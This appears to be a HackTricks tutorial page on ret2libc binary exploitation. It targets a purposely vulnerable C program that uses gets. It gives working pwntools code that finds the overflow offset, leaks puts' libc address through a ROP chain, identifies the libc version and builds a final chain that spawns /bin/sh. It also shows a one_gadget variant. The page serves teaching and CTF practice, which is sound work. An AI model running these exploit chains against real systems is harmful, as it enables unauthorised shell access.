_body: "# Leaking libc address with ROP\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n## Quick Resume\n\n\
  1. **Find** overflow **offset**\n2. **Find** `POP_RDI` gadget, `PUTS_PLT` and `MAIN` gadgets\n3. Use previous gadgets lo\
  \ **leak the memory address** of puts or another libc function and **find the libc version** ([donwload it](https://libc.blukat.me))\n\
  4. With the library, **calculate the ROP and exploit it**\n\n## Other tutorials and binaries to practice\n\nThis tutorial\
  \ is going to exploit the code/binary proposed in this tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\\\
  \nAnother useful tutorials: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)\n\
  \n## Code\n\nFilename: `vuln.c`\n\n```c\n#include <stdio.h>\n\nint main() {\n    char buffer[32];\n    puts(\"Simple ROP.\\\
  n\");\n    gets(buffer);\n\n    return 0;\n}\n```\n\n```bash\ngcc -o vuln vuln.c -fno-stack-protector -no-pie\n```\n\n##\
  \ ROP - Leaking LIBC template\n\nDownload the exploit and place it in the same directory as the vulnerable binary and give\
  \ the needed data to the script:\n\n\n{{#ref}}\nrop-leaking-libc-template.md\n{{#endref}}\n\n## 1- Finding the offset\n\n\
  The template need an offset before continuing with the exploit. If any is provided it will execute the necessary code to\
  \ find it (by default `OFFSET = \"\"`):\n\n```bash\n###################\n### Find offset ###\n###################\nOFFSET\
  \ = \"\"#\"A\"*72\nif OFFSET == \"\":\n    gdb.attach(p.pid, \"c\") #Attach and continue\n    payload = cyclic(1000)\n \
  \   print(r.clean())\n    r.sendline(payload)\n    #x/wx $rsp -- Search for bytes that crashed the application\n    #cyclic_find(0x6161616b)\
  \ # Find the offset of those bytes\n    return\n```\n\n**Execute** `python template.py` a GDB console will be opened with\
  \ the program being crashed. Inside that **GDB console** execute `x/wx $rsp` to get the **bytes** that were going to overwrite\
  \ the RIP. Finally get the **offset** using a **python** console:\n\n```python\nfrom pwn import *\ncyclic_find(0x6161616b)\n\
  ```\n\n![](<../../../../images/image (1007).png>)\n\nAfter finding the offset (in this case 40) change the OFFSET variable\
  \ inside the template using that value.\\\n`OFFSET = \"A\" * 40`\n\nAnother way would be to use: `pattern create 1000` --\
  \ _execute until ret_ -- `pattern seach $rsp` from GEF.\n\n## 2- Finding Gadgets\n\nNow we need to find ROP gadgets inside\
  \ the binary. This ROP gadgets will be useful to call `puts`to find the **libc** being used, and later to **launch the final\
  \ exploit**.\n\n```python\nPUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols[\"puts\"] # This is also valid to call puts\n\
  MAIN_PLT = elf.symbols['main']\nPOP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep\
  \ \"pop rdi\"\nRET = (rop.find_gadget(['ret']))[0]\n\nlog.info(\"Main start: \" + hex(MAIN_PLT))\nlog.info(\"Puts plt: \"\
  \ + hex(PUTS_PLT))\nlog.info(\"pop rdi; ret  gadget: \" + hex(POP_RDI))\n```\n\nThe `PUTS_PLT` is needed to call the **function\
  \ puts**.\\\nThe `MAIN_PLT` is needed to call the **main function** again after one interaction to **exploit** the overflow\
  \ **again** (infinite rounds of exploitation). **It is used at the end of each ROP to call the program again**.\\\nThe **POP_RDI**\
  \ is needed to **pass** a **parameter** to the called function.\n\nIn this step you don't need to execute anything as everything\
  \ will be found by pwntools during the execution.\n\n## 3- Finding libc library\n\nNow is time to find which version of\
  \ the **libc** library is being used. To do so we are going to **leak** the **address** in memory of the **function** `puts`and\
  \ then we are going to **search** in which **library version** the puts version is in that address.\n\n```python\ndef get_addr(func_name):\n\
  \    FUNC_GOT = elf.got[func_name]\n    log.info(func_name + \" GOT @ \" + hex(FUNC_GOT))\n    # Create rop chain\n    rop1\
  \ = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)\n\n    #Send our rop-chain payload\n    #p.sendlineafter(\"\
  dah?\", rop1) #Interesting to send in a specific moment\n    print(p.clean()) # clean socket buffer (read all and print)\n\
  \    p.sendline(rop1)\n\n    #Parse leaked address\n    recieved = p.recvline().strip()\n    leak = u64(recieved.ljust(8,\
  \ \"\\x00\"))\n    log.info(\"Leaked libc address,  \"+func_name+\": \"+ hex(leak))\n    #If not libc yet, stop here\n \
  \   if libc != \"\":\n        libc.address = leak - libc.symbols[func_name] #Save libc base\n        log.info(\"libc base\
  \ @ %s\" % hex(libc.address))\n\n    return hex(leak)\n\nget_addr(\"puts\") #Search for puts address in memmory to obtains\
  \ libc base\nif libc == \"\":\n    print(\"Find the libc library and continue with the exploit... (https://libc.blukat.me/)\"\
  )\n    p.interactive()\n```\n\nTo do so, the most important line of the executed code is:\n\n```python\nrop1 = OFFSET +\
  \ p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)\n```\n\nThis will send some bytes util **overwriting** the\
  \ **RIP** is possible: `OFFSET`.\\\nThen, it will set the **address** of the gadget `POP_RDI` so the next address (`FUNC_GOT`)\
  \ will be saved in the **RDI** registry. This is because we want to **call puts** **passing** it the **address** of the\
  \ `PUTS_GOT`as the address in memory of puts function is saved in the address pointing by `PUTS_GOT`.\\\nAfter that, `PUTS_PLT`\
  \ will be called (with `PUTS_GOT` inside the **RDI**) so puts will **read the content** inside `PUTS_GOT` (**the address\
  \ of puts function in memory**) and will **print it out**.\\\nFinally, **main function is called again** so we can exploit\
  \ the overflow again.\n\nThis way we have **tricked puts function** to **print** out the **address** in **memory** of the\
  \ function **puts** (which is inside **libc** library). Now that we have that address we can **search which libc version\
  \ is being used**.\n\n![](<../../../../images/image (1049).png>)\n\nAs we are **exploiting** some **local** binary it is\
  \ **not needed** to figure out which version of **libc** is being used (just find the library in `/lib/x86_64-linux-gnu/libc.so.6`).\\\
  \nBut, in a remote exploit case I will explain here how can you find it:\n\n### 3.1- Searching for libc version (1)\n\n\
  You can search which library is being used in the web page: [https://libc.blukat.me/](https://libc.blukat.me)\\\nIt will\
  \ also allow you to download the discovered version of **libc**\n\n![](<../../../../images/image (221).png>)\n\n### 3.2-\
  \ Searching for libc version (2)\n\nYou can also do:\n\n- `$ git clone https://github.com/niklasb/libc-database.git`\n-\
  \ `$ cd libc-database`\n- `$ ./get`\n\nThis will take some time, be patient.\\\nFor this to work we need:\n\n- Libc symbol\
  \ name: `puts`\n- Leaked libc adddress: `0x7ff629878690`\n\nWe can figure out which **libc** that is most likely used.\n\
  \n```bash\n./find puts 0x7ff629878690\nubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)\narchive-glibc (id libc6_2.23-0ubuntu11_amd64)\n\
  ```\n\nWe get 2 matches (you should try the second one if the first one is not working). Download the first one:\n\n```bash\n\
  ./download libc6_2.23-0ubuntu10_amd64\nGetting libc6_2.23-0ubuntu10_amd64\n  -> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb\n\
  \  -> Downloading package\n  -> Extracting package\n  -> Package saved to libs/libc6_2.23-0ubuntu10_amd64\n```\n\nCopy the\
  \ libc from `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` to our working directory.\n\n### 3.3- Other functions to leak\n\
  \n```python\nputs\nprintf\n__libc_start_main\nread\ngets\n```\n\n## 4- Finding based libc address & exploiting\n\nAt this\
  \ point we should know the libc library used. As we are exploiting a local binary I will use just:`/lib/x86_64-linux-gnu/libc.so.6`\n\
  \nSo, at the beginning of `template.py` change the **libc** variable to: `libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\"\
  ) #Set library path when know it`\n\nGiving the **path** to the **libc library** the rest of the **exploit is going to be\
  \ automatically calculated**.\n\nInside the `get_addr`function the **base address of libc** is going to be calculated:\n\
  \n```python\nif libc != \"\":\n    libc.address = leak - libc.symbols[func_name] #Save libc base\n    log.info(\"libc base\
  \ @ %s\" % hex(libc.address))\n```\n\n> [!TIP]\n> Note that **final libc base address must end in 00**. If that's not your\
  \ case you might have leaked an incorrect library.\n\nThen, the address to the function `system` and the **address** to\
  \ the string _\"/bin/sh\"_ are going to be **calculated** from the **base address** of **libc** and given the **libc library.**\n\
  \n```python\nBINSH = next(libc.search(\"/bin/sh\")) - 64 #Verify with find /bin/sh\nSYSTEM = libc.sym[\"system\"]\nEXIT\
  \ = libc.sym[\"exit\"]\n\nlog.info(\"bin/sh %s \" % hex(BINSH))\nlog.info(\"system %s \" % hex(SYSTEM))\n```\n\nFinally,\
  \ the /bin/sh execution exploit is going to be prepared sent:\n\n```python\nrop2 = OFFSET + p64(POP_RDI) + p64(BINSH) +\
  \ p64(SYSTEM) + p64(EXIT)\n\np.clean()\np.sendline(rop2)\n\n#### Interact with the shell #####\np.interactive() #Interact\
  \ with the conenction\n```\n\nLet's explain this final ROP.\\\nThe last ROP (`rop1`) ended calling again the main function,\
  \ then we can **exploit again** the **overflow** (that's why the `OFFSET` is here again). Then, we want to call `POP_RDI`\
  \ pointing to the **addres** of _\"/bin/sh\"_ (`BINSH`) and call **system** function (`SYSTEM`) because the address of _\"\
  /bin/sh\"_ will be passed as a parameter.\\\nFinally, the **address of exit function** is **called** so the process **exists\
  \ nicely** and any alert is generated.\n\n**This way the exploit will execute a _/bin/sh_ shell.**\n\n![](<../../../../images/image\
  \ (165).png>)\n\n## 4(2)- Using ONE_GADGET\n\nYou could also use [**ONE_GADGET** ](https://github.com/david942j/one_gadget)to\
  \ obtain a shell instead of using **system** and **\"/bin/sh\". ONE_GADGET** will find inside the libc library some way\
  \ to obtain a shell using just one **ROP address**.\\\nHowever, normally there are some constrains, the most common ones\
  \ and easy to avoid are like `[rsp+0x30] == NULL` As you control the values inside the **RSP** you just have to send some\
  \ more NULL values so the constrain is avoided.\n\n![](<../../../../images/image (754).png>)\n\n```python\nONE_GADGET =\
  \ libc.address + 0x4526a\nrop2 = base + p64(ONE_GADGET) + \"\\x00\"*100\n```\n\n## EXPLOIT FILE\n\nYou can find a template\
  \ to exploit this vulnerability here:\n\n\n{{#ref}}\nrop-leaking-libc-template.md\n{{#endref}}\n\n## Common problems\n\n\
  ### MAIN_PLT = elf.symbols\\['main'] not found\n\nIf the \"main\" symbol does not exist. Then you can find where is the\
  \ main code:\n\n```python\nobjdump -d vuln_binary | grep \"\\.text\"\nDisassembly of section .text:\n0000000000401080 <.text>:\n\
  ```\n\nand set the address manually:\n\n```python\nMAIN_PLT = 0x401080\n```\n\n### Puts not found\n\nIf the binary is not\
  \ using Puts you should check if it is using\n\n### `sh: 1: %s%s%s%s%s%s%s%s: not found`\n\nIf you find this **error** after\
  \ creating **all** the exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`\n\nTry to **subtract 64 bytes to the address of \"\
  /bin/sh\"**:\n\n```python\nBINSH = next(libc.search(\"/bin/sh\")) - 64\n```\n\n{{#include ../../../../banners/hacktricks-training.md}}"
